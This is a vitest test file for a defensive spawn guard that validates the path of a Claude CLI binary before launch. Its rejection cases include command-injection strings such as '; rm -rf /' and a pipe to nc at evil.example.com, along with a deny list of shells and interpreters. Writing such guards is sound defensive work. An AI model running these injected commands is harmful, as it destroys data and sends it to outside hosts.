/**
 * WP-9 Track 2 — `assertSpawnable` defense-in-depth guard.
 *
 * Verifies every rejection case in the spawn-guard table and confirms that
 * the canonical `claude` family of basenames is accepted.
 */
import { describe, it, expect } from 'vitest'
import { assertSpawnable } from '@/infrastructure/obsidian/assertSpawnable'
import { ClaudeCliError } from '@/domain/ports/ClaudeCliPort'

describe('assertSpawnable', () => {
  describe('accepts canonical claude binary basenames', () => {
    const accept: ReadonlyArray<string> = [
      '/usr/local/bin/claude',
      '/usr/bin/claude',
      '/opt/homebrew/bin/claude',
      '/home/user/.local/bin/claude',
      '/usr/local/bin/claude-code',
      'C:\\Program Files\\Claude\\claude.exe',
      'C:\\Users\\u\\AppData\\Local\\Programs\\claude\\claude.cmd',
      '/usr/local/bin/CLAUDE', // case-insensitive on basename
    ]
    for (const p of accept) {
      it(`accepts ${p}`, () => {
        const result = assertSpawnable(p)
        expect(result.ok).toBe(true)
      })
    }
  })

  describe('rejects empty input', () => {
    it('rejects the empty string', () => {
      const result = assertSpawnable('')
      expect(result.ok).toBe(false)
      if (!result.ok) {
        expect(result.error).toBeInstanceOf(ClaudeCliError)
        expect(result.error.errorCode).toBe('CLI_LAUNCH_FAILED')
        expect(result.error.message).toContain('SPAWN_GUARD_FAILED')
      }
    })
  })

  describe('rejects shell metacharacters', () => {
    const reject: ReadonlyArray<string> = [
      '/usr/local/bin/claude; rm -rf /',
      '/usr/local/bin/claude && evil',
      '/usr/local/bin/claude | nc evil.example.com 1234',
      '/usr/local/bin/claude`evil`',
      '/usr/local/bin/claude$EVIL',
      '/usr/local/bin/claude<input',
      '/usr/local/bin/claude>output',
      '/usr/local/bin/claude\nrm',
      '/usr/local/bin/claude\rrm',
    ]
    for (const p of reject) {
      it(`rejects ${JSON.stringify(p)}`, () => {
        const result = assertSpawnable(p)
        expect(result.ok).toBe(false)
        if (!result.ok) {
          expect(result.error.message).toContain('shell metacharacter')
        }
      })
    }
  })

  describe('rejects relative paths', () => {
    const reject: ReadonlyArray<string> = [
      'claude',
      './claude',
      '../bin/claude',
      'bin/claude',
      'npx claude',
    ]
    for (const p of reject) {
      it(`rejects ${JSON.stringify(p)}`, () => {
        const result = assertSpawnable(p)
        expect(result.ok).toBe(false)
        if (!result.ok) {
          // Note: "npx claude" contains a space which isn't a metachar by our
          // regex, so it falls through to the absolute-path check.
          expect(result.error.message).toContain('SPAWN_GUARD_FAILED')
        }
      })
    }
  })

  describe('rejects shells and interpreters by basename', () => {
    const reject: ReadonlyArray<string> = [
      '/bin/sh',
      '/bin/bash',
      '/usr/bin/sh',
      '/usr/bin/bash',
      '/bin/zsh',
      '/usr/bin/zsh',
      '/bin/dash',
      '/bin/fish',
      '/bin/ksh',
      '/bin/csh',
      '/bin/tcsh',
      'C:\\Windows\\System32\\cmd.exe',
      'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      'C:\\Program Files\\PowerShell\\7\\pwsh.exe',
      'C:\\Windows\\System32\\wsl.exe',
      '/usr/bin/env',
      '/usr/bin/node',
      'C:\\Program Files\\nodejs\\node.exe',
    ]
    for (const p of reject) {
      it(`rejects ${JSON.stringify(p)}`, () => {
        const result = assertSpawnable(p)
        expect(result.ok).toBe(false)
        if (!result.ok) {
          expect(result.error.message).toContain('shell or interpreter')
        }
      })
    }
  })

  describe('rejects non-claude basenames', () => {
    const reject: ReadonlyArray<string> = [
      '/usr/local/bin/curl',
      '/usr/bin/whoami',
      '/usr/local/bin/claude-something-else', // -something-else not allowed
      '/usr/local/bin/anthropic',
      '/usr/local/bin/claud', // typo
      '/usr/local/bin/cclaude',
      'C:\\foo\\claude.sh', // unsupported suffix
    ]
    for (const p of reject) {
      it(`rejects ${JSON.stringify(p)}`, () => {
        const result = assertSpawnable(p)
        expect(result.ok).toBe(false)
        if (!result.ok) {
          expect(result.error.message).toContain('SPAWN_GUARD_FAILED')
        }
      })
    }
  })

  describe('error envelope shape', () => {
    it('surfaces as ClaudeCliError with code CLI_LAUNCH_FAILED', () => {
      const result = assertSpawnable('/bin/sh')
      expect(result.ok).toBe(false)
      if (!result.ok) {
        expect(result.error).toBeInstanceOf(ClaudeCliError)
        expect(result.error.errorCode).toBe('CLI_LAUNCH_FAILED')
        expect(result.error.name).toBe('ClaudeCliError')
      }
    })
  })
})
